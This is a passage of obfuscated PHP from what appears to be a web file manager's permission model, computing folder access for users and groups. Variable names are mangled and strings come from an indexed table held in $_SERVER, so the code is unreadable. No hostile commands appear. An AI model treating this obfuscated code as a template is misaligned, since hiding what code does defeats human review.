{ return !1; } $Õ¥§°† = 1; $é€³éîü = $™«¦ÚÈ¤[$ØÅ‡§¦·[540]]; if ($é€³éîü != $Õ¥§°†) { $Ç²½Úøà = array($ØÅ‡§¦·[1899] => $é€³éîü); $º­ÄÇ« = Model($ØÅ‡§¦·[1989])->field($ØÅ‡§¦·[1701])->where($Ç²½Úøà)->select(); $º­ÄÇ« = array_to_keyvalue($º­ÄÇ«, $ØÅ‡§¦·[12], $ØÅ‡§¦·[1701]); } $»“¢şË² = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $™¹É®‘œ = array(); foreach ($›£¨šğ¸ as $¹ğ”¡¯) { if (!in_array($¹ğ”¡¯[$ØÅ‡§¦·[180]], $»“¢şË²)) { show_json(LNG($ØÅ‡§¦·[2081]), !1); } if ($é€³éîü != $Õ¥§°†) { if ($¹ğ”¡¯[$ØÅ‡§¦·[180]] == SourceModel::TYPE_GROUP) { } if ($¹ğ”¡¯[$ØÅ‡§¦·[540]] != 0 && !in_array($¹ğ”¡¯[$ØÅ‡§¦·[540]], $º­ÄÇ«)) { } } if ($¹ğ”¡¯[$ØÅ‡§¦·[540]] == 0) { $¹ğ”¡¯[$ØÅ‡§¦·[180]] = SourceModel::TYPE_USER; } $™¹É®‘œ[] = array($ØÅ‡§¦·[183] => $Êë½¤ÑÇ, $ØÅ‡§¦·[180] => intval($¹ğ”¡¯[$ØÅ‡§¦·[180]]), $ØÅ‡§¦·[540] => intval($¹ğ”¡¯[$ØÅ‡§¦·[540]]), $ØÅ‡§¦·[2003] => intval($¹ğ”¡¯[$ØÅ‡§¦·[2003]]) ? intval($¹ğ”¡¯[$ØÅ‡§¦·[2003]]) : 0, $ØÅ‡§¦·[2063] => intval($¹ğ”¡¯[$ØÅ‡§¦·[2063]]) ? intval($¹ğ”¡¯[$ØÅ‡§¦·[2063]]) : -1); } $this->where(array($ØÅ‡§¦·[461] => $Êë½¤ÑÇ))->delete(); $this->addAll($™¹É®‘œ); return !0; } public function authClear($¦—„™õ¤) { $üçÏŸ±´ =& $_SERVER[ò«¥Ê‡å]; $øš ŒÜ = Model($üçÏŸ±´[1380])->sourceInfo($¦—„™õ¤); $Ã¼¡Ğ— = array($¦—„™õ¤); if ($øš ŒÜ[$üçÏŸ±´[455]] == $üçÏŸ±´[90]) { $Òš¬Êª— = array($üçÏŸ±´[622] => array($üçÏŸ±´[582], $øš ŒÜ[$üçÏŸ±´[555]] . $¦—„™õ¤ . $üçÏŸ±´[583])); $Ã¼¡Ğ— = Model($üçÏŸ±´[1380])->field($üçÏŸ±´[461])->where($Òš¬Êª—)->getField($üçÏŸ±´[183], !0); $Ã¼¡Ğ—[] = $¦—„™õ¤; } $this->where(array($üçÏŸ±´[461] => array($üçÏŸ±´[462], $Ã¼¡Ğ—)))->delete(); return !0; } public function getAllChildren($å¶áéù®) { $À·»Á ­ =& $_SERVER[ò«¥Ê‡å]; $±ÔëÅì = Model($À·»Á ­[1380])->sourceInfo($å¶áéù®); if ($±ÔëÅì[$À·»Á ­[455]] != $À·»Á ­[90]) { return $this->sourceListAuth(array($å¶áéù®)); } if ($±ÔëÅì[$À·»Á ­[180]] != SourceModel::TYPE_GROUP) { return array(); } $úĞë‰é“ = 1; $ª÷›Êƒ½ = array($å¶áéù®); if ($±ÔëÅì[$À·»Á ­[182]] == $À·»Á ­[214] && $±ÔëÅì[$À·»Á ­[540]] != $úĞë‰é“) { $ª÷›Êƒ½ = $this->groupChidldAllRootSource($±ÔëÅì[$À·»Á ­[540]]); } $…÷–›è = $this->field($À·»Á ­[183])->group($À·»Á ­[183])->select(); $…÷–›è = array_to_keyvalue($…÷–›è, $À·»Á ­[12], $À·»Á ­[183]); if (!$…÷–›è) { return array(); } $‘™Á¥àé = $À·»Á ­[2082]; $¶İÇíøç = array($À·»Á ­[183] => array($À·»Á ­[7], $…÷–›è), $À·»Á ­[475] => $À·»Á ­[214]); $Èí¢ŒéÅ = Model($À·»Á ­[871])->field($‘™Á¥àé)->where($¶İÇíøç)->select(); $µûÅ±µı = array($å¶áéù®); foreach ($Èí¢ŒéÅ as $² °Å›ì) { foreach ($ª÷›Êƒ½ as $õä±–ëõ) { $øŒ¼ßù« = $À·»Á ­[50] . $õä±–ëõ . $À·»Á ­[50]; $ÑÒ”ÜÅ = $² °Å›ì[$À·»Á ­[555]] . $² °Å›ì[$À·»Á ­[183]] . $À·»Á ­[50]; if (strstr($ÑÒ”ÜÅ, $øŒ¼ßù«)) { $µûÅ±µı[] = $² °Å›ì[$À·»Á ­[183]]; break; } } } return $this->sourceListAuth($µûÅ±µı); } private function sourceListAuth($ˆ ì˜øÏ) { $ú¤´ôì· =& $_SERVER[ò«¥Ê‡å]; $…ï¥Ì¢æ = Model($ú¤´ôì·[1380])->sourceListInfo($ˆ ì˜øÏ, !0); $ğ°ÜôÀ• = $this->sourceAuthSelect($ˆ ì˜øÏ); $—¢ßãéâ = array(); $”ÏÙß®œ = array(); foreach ($…ï¥Ì¢æ as $ëÔü€»÷) { unset($ëÔü€»÷[$ú¤´ôì·[499]]); unset($ëÔü€»÷[$ú¤´ôì·[497]]); unset($ëÔü€»÷[$ú¤´ôì·[457]]); unset($ëÔü€»÷[$ú¤´ôì·[89]]); $¿ş™¿ëÌ = $ğ°ÜôÀ•[$ëÔü€»÷[$ú¤´ôì·[183]]]; if (!$¿ş™¿ëÌ) { continue; } $ëÔü€»÷[$ú¤´ôì·[2083]] = $this->authTargetInfo($¿ş™¿ëÌ); $ëÔü€»÷[$ú¤´ôì·[553]] = rtrim($ëÔü€»÷[$ú¤´ôì·[559]], $ú¤´ôì·[8]) . $ú¤´ôì·[8] . ltrim($ëÔü€»÷[$ú¤´ôì·[553]], $ú¤´ôì·[8]); $—¢ßãéâ[] = $ëÔü€»÷; $æ‹¼ŒÎ× = count(explode($ú¤´ôì·[8], trim($ëÔü€»÷[$ú¤´ôì·[553]], $ú¤´ôì·[8]))); $”ÏÙß®œ[] = $æ‹¼ŒÎ× + ($ëÔü€»÷[$ú¤´ôì·[33]] == $ú¤´ôì·[77] ? 0 : 1000); } array_multisort($”ÏÙß®œ, SORT_ASC, $—¢ßãéâ); return $—¢ßãéâ; } private function groupChidldAllRootSource($â™‹·Ú) { $Ò¡ÜŠèà =& $_SERVER[ò«¥Ê‡å]; $Üã…Æ¼© = Model($Ò¡ÜŠèà[2084])->groupChildrenAll($â™‹·Ú); $¸°¤°íí = array($Ò¡ÜŠèà[182] => 0, $Ò¡ÜŠèà[540] => array($Ò¡ÜŠèà[7], $Üã…Æ¼©), $Ò¡ÜŠèà[180] => SourceModel::TYPE_GROUP); $Ó¢şÇ±¤ = Model($Ò¡ÜŠèà[871])->field($Ò¡ÜŠèà[183])->where($¸°¤°íí)->select(); $Ó¢şÇ±¤ = array_to_keyvalue($Ó¢şÇ±¤, $Ò¡ÜŠèà[12], $Ò¡ÜŠèà[183]); return $Ó¢şÇ±¤; } private function authTargetInfo($ÒÙî¤”Ê) { $Ğ‡Ó²£ª =& $_SERVER[ò«¥Ê‡å]; $óèŠƒÂ = array(); $ó£­óÃ‡ = array(); $ïŸÊôç­ = 2 << 25; foreach ($ÒÙî¤”Ê as $­“´…ü†) { $Ù¾ÌƒÎ£ = Model($Ğ‡Ó²£ª[542])->listData($­“´…ü†[$Ğ‡Ó²£ª[2003]]); if (!$Ù¾ÌƒÎ£) { continue; } if ($­“´…ü†[$Ğ‡Ó²£ª[180]] == SourceModel::TYPE_USER) { $ÜÜÓĞÉ“ = Model($Ğ‡Ó²£ª[548])->getInfoSimpleOuter($­“´…ü†[$Ğ‡Ó²£ª[540]]); if ($ÜÜÓĞÉ“[$Ğ‡Ó²£ª[1701]] == $Ğ‡Ó²£ª[1235]) { continue; } if ($ÜÜÓĞÉ“[$Ğ‡Ó²£ª[1701]] == $Ğ‡Ó²£ª[214]) { $ÜÜÓĞÉ“[$Ğ‡Ó²£ª[32]] = LNG($Ğ‡Ó²£ª[2085]); } } else { $ÜÜÓĞÉ“ = Model($Ğ‡Ó²£ª[556])->getInfoSimple($­“´…ü†[$Ğ‡Ó²£ª[540]]); } if (!$ÜÜÓĞÉ“) { continue; } $ÜÜÓĞÉ“[$Ğ‡Ó²£ª[510]] = $Ù¾ÌƒÎ£; $óèŠƒÂ[] = $ÜÜÓĞÉ“; $Ê‚Èˆúç = 0; if ($­“´…ü†[$Ğ‡Ó²£ª[180]] == SourceModel::TYPE_GROUP) { $Ê‚Èˆúç = $ïŸÊôç­ * 2; } if ($­“´…ü†[$Ğ‡Ó²£ª[180]] == SourceModel::TYPE_USER) { $Ê‚Èˆúç = $ïŸÊôç­; } if ($­“´…ü†[$Ğ‡Ó²£ª[180]] == SourceModel::TYPE_USER && $­“´…ü†[$Ğ‡Ó²£ª[540]] == $Ğ‡Ó²£ª[214]) { $Ê‚Èˆúç = 0; } $ó£­óÃ‡[] = $Ù¾ÌƒÎ£[$Ğ‡Ó²£ª[457]] + $Ê‚Èˆúç; } array_multisort($ó£­óÃ‡, SORT_DESC, $óèŠƒÂ); return $óèŠƒÂ; } public function getAllChildrenByUser($Öõ®Á¬, $áÌ˜¸¿”) { $® ¿ş×Á =& $_SERVER[ò«¥Ê‡å]; $©ˆåÜúç = Model($® ¿ş×Á[569])->getInfo($áÌ˜¸¿”); if (!$áÌ˜¸¿” || !$Öõ®Á¬ || !$©ˆåÜúç) { return array(); } $”„°Ç§ = Model($® ¿ş×Á[1380])->sourceInfo($Öõ®Á¬); $›ıÏ…ï = array(); $‚Éæôƒ = 1; if ($”„°Ç§[$® ¿ş×Á[182]] == $® ¿ş×Á[214] && $”„°Ç§[$® ¿ş×Á[540]] != $‚Éæôƒ && $this->groupContainUser($”„°Ç§[$® ¿ş×Á[540]], $áÌ˜¸¿”)) { foreach ($©ˆåÜúç[$® ¿ş×Á[2086]] as $˜¦¯¦) { $ˆ§ì’Õô = Model($® ¿ş×Á[556])->getInfo($˜¦¯¦[$® ¿ş×Á[1899]]); $§àœú¾Á = Model($® ¿ş×Á[569])->getInfoSimpleOuter($áÌ˜¸¿”); $§àœú¾Á[$® ¿ş×Á[510]] = $˜¦¯¦[$® ¿ş×Á[457]]; if (Model($® ¿ş×Á[542])->authCheckAction($˜¦¯¦[$® ¿ş×Á[457]][$® ¿ş×Á[457]], $® ¿ş×Á[1920])) { continue; } $ÛÛáÌÌ = array($® ¿ş×Á[32] => $® ¿ş×Á[1255] . $ˆ§ì’Õô[$® ¿ş×Á[32]], $® ¿ş×Á[183] => $ˆ§ì’Õô[$® ¿ş×Á[89]][$® ¿ş×Á[183]], $® ¿ş×Á[86] => KodIO::make($ˆ§ì’Õô[$® ¿ş×Á[89]][$® ¿ş×Á[183]]), $® ¿ş×Á[182] => $® ¿ş×Á[214], $® ¿ş×Á[180] => $® ¿ş×Á[549], $® ¿ş×Á[33] => $® ¿ş×Á[586], $® ¿ş×Á[553] => $ˆ§ì’Õô[$® ¿ş×Á[560]], $® ¿ş×Á[1899] => $ˆ§ì’Õô[$® ¿ş×Á[1899]], $® ¿ş×Á[557] => $ˆ§ì’Õô[$® ¿ş×Á[182]], $® ¿ş×Á[2083] => array($§àœú¾Á)); $›ıÏ…ï[$ÛÛáÌÌ[$® ¿ş×Á[183]]] = $ÛÛáÌÌ; } } $Ì½ùİÖ = array(); $ŠÌßğ§ä = $this->getAllChildren($Öõ®Á¬); foreach ($ŠÌßğ§ä as $¹ş„‹èÒ) { $Å´€ôæ… = !1; foreach ($¹ş„‹èÒ[$® ¿ş×Á[2083]] as $·Œ•Ğ) { if ($·Œ•Ğ[$® ¿ş×Á[1701]]) { if ($·Œ•Ğ[$® ¿ş×Á[1701]] == $áÌ˜¸¿”) { $Å´€ôæ… = !0; break; } } if ($·Œ•Ğ[$® ¿ş×Á[1899]]) { if ($this->groupContainUser($·Œ•Ğ[$® ¿ş×Á[1899]], $áÌ˜¸¿”)) { $Å´€ôæ… = !0; break; } } } if ($Å´€ôæ…) { $Ì½ùİÖ[] = $¹ş„‹èÒ; } $­ÈèŸÎ = $¹ş„‹èÒ[$® ¿ş×Á[183]]; if (isset($›ıÏ…ï[$­ÈèŸÎ])) { $¹ş„‹èÒ[$® ¿ş×Á[2083]][] = $›ıÏ…ï[$­ÈèŸÎ][0]; $›ıÏ…ï[$­ÈèŸÎ] = !1; } } $›ıÏ…ï = array_filter(array_values($›ıÏ…ï)); $Ì½ùİÖ = array_merge($›ıÏ…ï, $Ì½ùİÖ); return $Ì½ùİÖ; } public function setAllChildrenByUser($²Ó°æÏÎ, $º™ ùåÇ, $úÔüÜå) { $ïŒ ¹ª =& $_SERVER[ò«¥Ê‡å]; $ÆÆ”‚­” = $this->getAllChildrenByUser($²Ó°æÏÎ, $º™ ùåÇ); if (!$úÔüÜå || !$ÆÆ”‚­”) { return !1; } foreach ($ÆÆ”‚­” as $Êïªä‚) { $ôš³æè„ = array(); foreach ($Êïªä‚[$ïŒ ¹ª[2083]] as $—Ãá‰š÷) { $¹¤öà‹ = $—Ãá‰š÷[$ïŒ ¹ª[510]]; $ëŞêÉŸº = $—Ãá‰š÷[$ïŒ ¹ª[1701]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Š—ßÂÆï = $—Ãá‰š÷[$ïŒ ¹ª[1701]] ? $—Ãá‰š÷[$ïŒ ¹ª[1701]] : $—Ãá‰š÷[$ïŒ ¹ª[1899]]; if ($—Ãá‰š÷[$ïŒ ¹ª[1701]] && $—Ãá‰š÷[$ïŒ ¹ª[1701]] == $º™ ùåÇ) { continue; } $ôš³æè„[] = array($ïŒ ¹ª[183] => $Êïªä‚[$ïŒ ¹ª[183]], $ïŒ ¹ª[180] => $ëŞêÉŸº, $ïŒ ¹ª[540] => intval($Š—ßÂÆï), $ïŒ ¹ª[2003] => isset($¹¤öà‹[$ïŒ ¹ª[445]]) ? intval($¹¤öà‹[$ïŒ ¹ª[445]]) : 0, $ïŒ ¹ª[2063] => isset($¹¤öà‹[$ïŒ ¹ª[2063]]) ? intval($¹¤öà‹[$ïŒ ¹ª[2063]]) : -1); } $ôš³æè„[] = array($ïŒ ¹ª[183] => $Êïªä‚[$ïŒ ¹ª[183]], $ïŒ ¹ª[180] => SourceModel::TYPE_USER, $ïŒ ¹ª[540] => intval($º™ ùåÇ), $ïŒ ¹ª[2003] => intval($úÔüÜå), $ïŒ ¹ª[2063] => -1); $this->where(array($ïŒ ¹ª[461] => $Êïªä‚[$ïŒ ¹ª[183]]))->delete(); $this->addAll($ôš³æè„); } return !0; } public function get($¸ºø¬ıê) { $Õ”Ø¾øŒ = $this->getSourceList(array($¸ºø¬ıê), !0); return $Õ”Ø¾øŒ[0]; } public function getSourceList($‡‹‚‚ëÜ, $Ş÷Á¥„¹ = false, $ÒÃÃÂÕ = false) { $æøª·ë™ =& $_SERVER[ò«¥Ê‡å]; if (!$‡‹‚‚ëÜ) { return array(); } $ÃŞ’İó— = Model($æøª·ë™[1380]); if (!$Ş÷Á¥„¹ && count($‡‹‚‚ëÜ) == 1) { $Ş÷Á¥„¹ = array(); $Ş÷Á¥„¹[$‡‹‚‚ëÜ[0]] = $ÃŞ’İó—->sourceInfo($‡‹‚‚ëÜ[0]); } if (!$Ş÷Á¥„¹) { $ŠšÂÙÂ† = array($æøª·ë™[461] => array($æøª·ë™[462], $‡‹‚‚ëÜ)); $Ş÷Á¥„¹ = $ÃŞ’İó—->field($æøª·ë™[2087])->where($ŠšÂÙÂ†)->select(); $Ş÷Á¥„¹ = array_to_keyvalue($Ş÷Á¥„¹, $æøª·ë™[183]); } $–Ë¶˜¯Ï = $‡‹‚‚ëÜ; foreach ($Ş÷Á¥„¹ as $£øÑó·ã => $â¢ÀÛ¨) { $ŒÙª¡·ó = $ÃŞ’İó—->parentLevelArray($â¢ÀÛ¨[$æøª·ë™[555]]); $–Ë¶˜¯Ï = array_merge($–Ë¶˜¯Ï, array($£øÑó·ã), array_reverse($ŒÙª¡·ó)); } $–Ë¶˜¯Ï = array_values(array_unique($–Ë¶˜¯Ï)); if (!$–Ë¶˜¯Ï) { return array(); } $üÚé¨´ã = $this->sourceAuthSelect($–Ë¶˜¯Ï); $÷å»ÖÀˆ = array(); foreach ($–Ë¶˜¯Ï as $‚‘—ˆÎ˜) { if (isset($üÚé¨´ã[$‚‘—ˆÎ˜])) { $÷å»ÖÀˆ[$‚‘—ˆÎ˜] = $üÚé¨´ã[$‚‘—ˆÎ˜]; } } $óÖ÷÷² = $this->userIsRoot($ÒÃÃÂÕ); $ŸİŒ¦ğ = AuthModel::authAll(); $åª¥àº = array($æøª·ë™[458] => $ŸİŒ¦ğ, $æøª·ë™[2088] => array($æøª·ë™[463] => 0, $æøª·ë™[1905] => $ŸİŒ¦ğ, $æøª·ë™[464] => LNG($æøª·ë™[2089]), $æøª·ë™[1922] => $æøª·ë™[2090])); $«ô„í§ = array(); foreach ($Ş÷Á¥„¹ as $‚‘—ˆÎ˜ => $Îşï¾á) { if ($óÖ÷÷² && $GLOBALS[$æøª·ë™[6]][$æøª·ë™[1918]]) { $«ô„í§[$‚‘—ˆÎ˜] = $åª¥àº; continue; } $«ô„í§[$‚‘—ˆÎ˜] = $this->makeSourceAuth($Îşï¾á, $÷å»ÖÀˆ, $ÒÃÃÂÕ); } return $«ô„í§; } public function authDeepCheck($åŠ¤²«Å, $€·ñ×ı› = false) { $¹¤²ãî„ =& $_SERVER[ò«¥Ê‡å]; $€·ñ×ı› = $€·ñ×ı› ? $€·ñ×ı› : USER_ID; $Î˜ìµÒş = $this->makeAuthDeep($€·ñ×ı›); if (!in_array($åŠ¤²«Å, $Î˜ìµÒş[$¹¤²ãî„[2091]])) { return !1; } $·ù•¦¾ = array(); foreach ($Î˜ìµÒş[$¹¤²ãî„[2092]] as $ò‡¡ŞĞå => $Ü«ï©Ô­) { if (!in_array($åŠ¤²«Å, $Ü«ï©Ô­)) { continue; } $·ù•¦¾[] = $ò‡¡ŞĞå; } if (!$·ù•¦¾) { return !1; } $›ö§ìÍ× = $·ù•¦¾ ? $·ù•¦¾[0] : $åŠ¤²«Å; return array($¹¤²ãî„[458] => -1, $¹¤²ãî„[510] => array($¹¤²ãî„[463] => $¹¤²ãî„[1235], $¹¤²ãî„[1905] => $¹¤²ãî„[214], $¹¤²ãî„[464] => LNG($¹¤²ãî„[2093]), $¹¤²ãî„[1922] => $¹¤²ãî„[2094]), $¹¤²ãî„[2095] => LNG($¹¤²ãî„[2096]), $¹¤²ãî„[2097] => $this->sourceAuthInfo($›ö§ìÍ×)); } protected function makeAuthDeep($¹õóÙØ¨ = false) { $†Ğ§¸ƒş =& $_SERVER[ò«¥Ê‡å]; static $äĞ½ = array(); $¹õóÙØ¨ = $¹õóÙØ¨ ? $¹õóÙØ¨ : USER_ID; if (isset($äĞ½[$¹õóÙØ¨])) { return $äĞ½[$¹õóÙØ¨]; } $ï‹‹£äû = Model($†Ğ§¸ƒş[2098])->listData(); $¹‘Ø¼è§ = array(); foreach ($ï‹‹£äû as $Ôê³šòá) { if ($Ôê³šòá[$†Ğ§¸ƒş[457]] == 0 && $Ôê³šòá[$†Ğ§¸ƒş[1921]] == $†Ğ§¸ƒş[90]) { $¹‘Ø¼è§[] = $Ôê³šòá[$†Ğ§¸ƒş[445]]; } } $½Å¹ş¸ = $this->userGroupParents($¹õóÙØ¨); $ÜšåŠëí = array($†Ğ§¸ƒş[180] => SourceModel::TYPE_USER, $†Ğ§¸ƒş[540] => $¹õóÙØ¨); if ($½Å¹ş¸) { $ÜšåŠëí = array(array($†Ğ§¸ƒş[180] => SourceModel::TYPE_USER, $†Ğ§¸ƒş[540] => $¹õóÙØ¨), array($†Ğ§¸ƒş[180] => SourceModel::TYPE_GROUP, $†Ğ§¸ƒş[540] => array($†Ğ§¸ƒş[462], $½Å¹ş¸)), $†Ğ§¸ƒş[1047] => $†Ğ§¸ƒş[1997]); } $ºÔ‡Ï„û = $this->field($†Ğ§¸ƒş[2099])->where($ÜšåŠëí)->select(); $†ÇâáŸû = array(); $Ì²çªï = array_to_keyvalue_group($ºÔ‡Ï„û, $†Ğ§¸ƒş[183]); foreach ($Ì²çªï as $·Õïä· => $Óö¯ç) { $‰ŠÇğ³ı = $this->authArrayCheck($Óö¯ç, $¹õóÙØ¨); if ($‰ŠÇğ³ı[$†Ğ§¸ƒş[458]] > 0) { $†ÇâáŸû[] = $·Õïä· . $†Ğ§¸ƒş[12]; } } if ($½Å¹ş¸) { $ÆÅãœ®ñ = Model($†Ğ§¸ƒş[556]); foreach ($½Å¹ş¸ as $ó·¥¾‰À) { $ÎÆ›û¶¡ = $ÆÅãœ®ñ->getInfo($ó·¥¾‰À); if (!$ÎÆ›û¶¡ || !is_array($ÎÆ›û¶¡[$†Ğ§¸ƒş[89]])) { continue; } $†ÇâáŸû[] = $ÎÆ›û¶¡[$†Ğ§¸ƒş[89]][$†Ğ§¸ƒş[183]]; } } $£»ÀŠƒÖ = array(); $¼¶ğœÉæ = $½Å¹ş¸; $í¸¡À·Ï = Model($†Ğ§¸ƒş[1380]); $ÆÅãœ®ñ = Model($†Ğ§¸ƒş[556]); $¡ç¦üÎ = array(); $’´†ÁÇİ = array(); $§î¬Ú•™ = array(); $Ù†”ìõ¼ = array(); if ($†ÇâáŸû) { $˜‹µõ† = $í¸¡À·Ï->where(array($†Ğ§¸ƒş[183] => array($†Ğ§¸ƒş[462], $†ÇâáŸû)))->select(); foreach ($˜‹µõ† as $‰§œÙğ¥) { $œº™şÒû = $í¸¡À·Ï->parentLevelArray($‰§œÙğ¥[$†Ğ§¸ƒş[555]]); $£»ÀŠƒÖ = array_merge($£»ÀŠƒÖ, $œº™şÒû); $¼¶ğœÉæ[] = $‰§œÙğ¥[$†Ğ§¸ƒş[540]]; $¡ç¦üÎ[$‰§œÙğ¥[$†Ğ§¸ƒş[183]]] = $œº™şÒû; $’´†ÁÇİ[$‰§œÙğ¥[$†Ğ§¸ƒş[183]]] = $‰§œÙğ¥[$†Ğ§¸ƒş[540]]; } } $¼¶ğœÉæ = array_values(array_unique($¼¶ğœÉæ)); $ñ©‹Ê§™ = $¼¶ğœÉæ; foreach ($ñ©‹Ê§™ as $ó·¥¾‰À) { $ÎÆ›û¶¡ = $ÆÅãœ®ñ->getInfo($ó·¥¾‰À); $œº™şÒû = $í¸¡À·Ï->parentLevelArray($ÎÆ›û¶¡[$†Ğ§¸ƒş[555]]); $¼¶ğœÉæ = array_merge($¼¶ğœÉæ, $œº™şÒû); } $¼¶ğœÉæ = array_values(array_unique($¼¶ğœÉæ)); foreach ($¼¶ğœÉæ as $ó·¥¾‰À) { $ÎÆ›û¶¡ = $ÆÅãœ®ñ->getInfo($ó·¥¾‰À); $£»ÀŠƒÖ[] = $ÎÆ›û¶¡[$†Ğ§¸ƒş[89]][$†Ğ§¸ƒş[183]]; $§î¬Ú•™[$ó·¥¾‰À] = $ÎÆ›û¶¡[$†Ğ§¸ƒş[89]][$†Ğ§¸ƒş[183]]; $Ù†”ìõ¼[$ó·¥¾‰À] = $í¸¡À·Ï->parentLevelArray($ÎÆ›û¶¡[$†Ğ§¸ƒş[555]]); } foreach ($¡ç¦üÎ as $†Ş­°ÏÇ => $“Ñâ¸Òß) { $Äò‰‡ø§ = $’´†ÁÇİ[$†Ş­°ÏÇ]; if (!$Äò‰‡ø§ || !$§î¬Ú•™[$Äò‰‡ø§]) { continue; } $Ö¶Æ¼  = array(); foreach ($Ù†”ìõ¼[$Äò‰‡ø§] as $ó·¥¾‰À) { $Ö¶Æ¼ [] = $§î¬Ú•™[$ó·¥¾‰À]; } $¡ç¦üÎ[$†Ş­°ÏÇ] = array_merge($Ö¶Æ¼ , $“Ñâ¸Òß); } $£»ÀŠƒÖ = array_values(array_unique($£»ÀŠƒÖ)); $©‘ÃşÓ³ = array($†Ğ§¸ƒş[2091] => $£»ÀŠƒÖ, $†Ğ§¸ƒş[2092] => $¡ç¦üÎ); $äĞ½[$¹õóÙØ¨] = $©‘ÃşÓ³; return $©‘ÃşÓ³; } private function makeSourceAuth($¦¹²ÃÓ, $‚¹É ”¿, $€áè°¼ı = false) { $½øÅ¥œæ =& $_SERVER[ò«¥Ê‡å]; $ÊÁµíœ = $½øÅ¥œæ[90]; $Ëšûæ¹• = $¦¹²ÃÓ[$½øÅ¥œæ[540]]; $Â÷ÑĞ¢ = $¦¹²ÃÓ[$½øÅ¥œæ[180]] == SourceModel::TYPE_GROUP; $£ü©õø´ = $Â÷ÑĞ¢ ? $this->groupRootAuth($Ëšûæ¹•, $€áè°¼ı) : !1; if ($£ü©õø´ && Model($½øÅ¥œæ[542])->authCheckAction($£ü©õø´[$½øÅ¥œæ[457]], $½øÅ¥œæ[1920])) { return $this->groupAuthInfo($£ü©õø´, $Ëšûæ¹•); } $½íÚßÙî = Model($½øÅ¥œæ[1380])->parentLevelArray($¦¹²ÃÓ[$½øÅ¥œæ[555]]); $½íÚßÙî = array_merge(array($¦¹²ÃÓ[$½øÅ¥œæ[183]]), array_reverse($½íÚßÙî)); $×¨Ù›š® = !1; foreach ($½íÚßÙî as $‚Ä±¼ëÄ) { if (!isset($‚¹É ”¿[$‚Ä±¼ëÄ])) { continue; } $äˆŠ²ÛÃ = $this->authMake($‚¹É ”¿[$‚Ä±¼ëÄ], $€áè°¼ı); if ($äˆŠ²ÛÃ[$½øÅ¥œæ[510]]) { $×¨Ù›š® = $äˆŠ²ÛÃ; break; } } if (!$Â÷ÑĞ¢) { return $×¨Ù›š®; } if (!$×¨Ù›š® && $£ü©õø´) { $×¨Ù›š® = $this->groupAuthInfo($£ü©õø´, $Ëšûæ¹•); } if (!$×¨Ù›š®) { $ãÛìî«Œ = Model($½øÅ¥œæ[556])->getInfo($Ëšûæ¹•); $‰µÌíÛº = explode($½øÅ¥œæ[50], trim($ãÛìî«Œ[$½øÅ¥œæ[555]], $½øÅ¥œæ[50])); $‰µÌíÛº = array_reverse($‰µÌíÛº); foreach ($‰µÌíÛº as $ª¿«Ğ‡ô) { if ($ª¿«Ğ‡ô == $½øÅ¥œæ[214] || $ª¿«Ğ‡ô == $ÊÁµíœ) { continue; } $£è­›¾ê = $this->groupRootAuth($ª¿«Ğ‡ô, $€áè°¼ı); if (!$£è­›¾ê) { continue; } $×¨Ù›š® = $this->groupAuthInfo($£è­›¾ê, $ª¿«Ğ‡ô); break; } } if (!$×¨Ù›š® || $×¨Ù›š®[$½øÅ¥œæ[458]] <= 0) { $…ıÉîíÀ = $this->authDeepCheck($¦¹²ÃÓ[$½øÅ¥œæ[183]], $€áè°¼ı); if ($…ıÉîíÀ) { $×¨Ù›š® = $…ıÉîíÀ; } } return $×¨Ù›š®; } private function userIsRoot($›òªÜ’ø = false) { $·ÏŒ˜ÊÚ =& $_SERVER[ò«¥Ê‡å]; if (!$›òªÜ’ø && KodUser::isRoot()) { return !0; } $Í®Ü ÒÇ = Model($·ÏŒ˜ÊÚ[569])->getInfo($›òªÜ’ø); $äà¿ãó = Model($·ÏŒ˜ÊÚ[2100])->listData($Í®Ü ÒÇ[$·ÏŒ˜ÊÚ[2101]]); if ($äà¿ãó && $äà¿ãó[$·ÏŒ˜ÊÚ[546]][$·ÏŒ˜ÊÚ[2102]] == 1) { return !0; } return !1; } private function sourceAuthInfo($µ³Šååù) { $Ö£ Ú¯ê =& $_SERVER[ò«¥Ê‡å]; $¯…”ÄçÈ = Model($Ö£ Ú¯ê[1380]); $ğÉÖ¥’É = $¯…”ÄçÈ->sourceInfo($µ³Šååù); if (!$ğÉÖ¥’É) { return !1; } $¯…”ÄçÈ->groupPathDisplay($ğÉÖ¥’É); $”Ü÷šØ = array($ğÉÖ¥’É); $”Ü÷šØ = $¯…”ÄçÈ->_listAppendPath($”Ü÷šØ); $ğÉÖ¥’É = $”Ü÷šØ[0]; $Ş‚¬œèş = $ğÉÖ¥’É[$Ö£ Ú¯ê[553]]; if (isset($ğÉÖ¥’É[$Ö£ Ú¯ê[561]])) { $ÆõÙ‰ú = explode($Ö£ Ú¯ê[8], trim($ğÉÖ¥’É[$Ö£ Ú¯ê[553]], $Ö£ Ú¯ê[8])); array_shift($ÆõÙ‰ú); $Ş‚¬œèş = $ğÉÖ¥’É[$Ö£ Ú¯ê[559]] . $Ö£ Ú¯ê[2103] . implode($Ö£ Ú¯ê[8], $ÆõÙ‰ú); } return array($Ö£ Ú¯ê[464] => $ğÉÖ¥’É[$Ö£ Ú¯ê[32]], $Ö£ Ú¯ê[86] => KodIO::make($ğÉÖ¥’É[$Ö£ Ú¯ê[183]]), $Ö£ Ú¯ê[2104] => $Ş‚¬œèş); } private function groupAuthInfo($ÍÕ•ÄÏâ, $ó­’Îß) { $¹§Ş‰­¡ =& $_SERVER[ò«¥Ê‡å]; $ŸíŒÙÈç = Model($¹§Ş‰­¡[556])->getInfo($ó­’Îß); return array($¹§Ş‰­¡[2105] => intval($ÍÕ•ÄÏâ[$¹§Ş‰­¡[457]]), $¹§Ş‰­¡[2088] => $ÍÕ•ÄÏâ, $¹§Ş‰­¡[2106] => LNG($¹§Ş‰­¡[2107]), $¹§Ş‰­¡[2097] => array($¹§Ş‰­¡[464] => $ŸíŒÙÈç[$¹§Ş‰­¡[32]], $¹§Ş‰­¡[86] => KodIO::make($ŸíŒÙÈç[$¹§Ş‰­¡[89]][$¹§Ş‰­¡[183]]), $¹§Ş‰­¡[2104] => $ŸíŒÙÈç[$¹§Ş‰­¡[560]])); } protected function groupRootAuth($—´ô˜Š±, $Äó“­É… = false) { $„ÙñÍœŒ =& $_SERVER[ò«¥Ê‡å]; $Äó“­É… = $Äó“­É… ? $Äó“­É… : USER_ID; $“ášêë = $Äó“­É… . $„ÙñÍœŒ[2108] . $—´ô˜Š±; static $­ˆİ¯ç = array(); if 